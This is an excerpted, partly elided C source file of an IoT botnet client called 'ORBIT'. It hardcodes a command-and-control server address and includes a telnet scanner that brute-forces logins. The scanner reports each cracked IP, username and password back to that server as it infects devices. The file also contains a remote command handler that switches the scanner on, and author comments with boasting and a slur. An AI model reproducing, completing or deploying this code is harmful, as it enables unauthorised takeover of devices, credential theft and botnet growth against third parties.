...
#define STD2_SIZE 69
#define orbit   "XXX#0304"
#define Version  "ORBIT"

//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------

unsigned char *commServer[] = { "84.46.246.159:1243" }; //216.158.238.34:42516   0 - 65535
...
void TelnetScanner(int wait_usec, int maxfds)
{
        ...
        //dont remove my credit fag @10gbps
        ...
        while(1) {
			...
			case 6:
				{
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) //waiting for response.
					{
						...
						else if(contains_success(fds[i].sockbuf))
						{
							...
							{
								sockprintf(mainCommSock, "[ ORBIT ] Result || IP: %s || Username: %s || Password: %s", get_telstate_host(&fds[i]), tel_usernames[fds[i].usernameInd], tel_passwords[fds[i].passwordInd]);
								advance_telstate(&fds[i], 7);
							}
						}
						else
			...
			{		
						...
						sockprintf(mainCommSock, "[ ORBIT ] Infecting || IP: %s || Username: %s || Password: %s", get_telstate_host(&fds[i]), tel_usernames[fds[i].usernameInd], tel_passwords[fds[i].passwordInd]);
						...
						{ 
							...
							{
								sockprintf(mainCommSock, "[ ORBIT ] Infection Success. || IP: %s || Username: %s || Password: %s", get_telstate_host(&fds[i]), tel_usernames[fds[i].usernameInd], tel_passwords[fds[i].passwordInd]); //follow meh on ig @10gbps
							}
						}
						...
						{	
							if(fds[i].complete!=3)
							{
								sockprintf(mainCommSock, "[ ORBIT ] Failed || IP: %s || Username: %s || Password: %s", get_telstate_host(&fds[i]), tel_usernames[fds[i].usernameInd], tel_passwords[fds[i].passwordInd]);
                            }
							reset_telstate(&fds[i]);
                        }
				break;
...
void processCmd(int argc, unsigned char *argv[]) {
		...
		if(!strcmp(argv[0], "TELNETSCANNER"))
		{
			if(!strcmp(argv[1], "ON"))
			{
...
int main(int argc, unsigned char *argv[]) {
        ...
        while(1) {
				if(fork() == 0) {
                if(initConnection()) { sleep(5); continue; } //why ur replacing this shit?
				sockprintf(mainCommSock, "\x1b[97m[\x1b[38;5;202mORBIT\x1b[97m] \x1b[38;5;202mArch: \x1b[97m%s \x1b[38;5;202mType: \x1b[97m%s", getBuild(), getEndianness());
				UpdateNameSrvs(); //go code ur own shitty source
				char commBuf[4096];
                int got = 0;
                int i = 0;
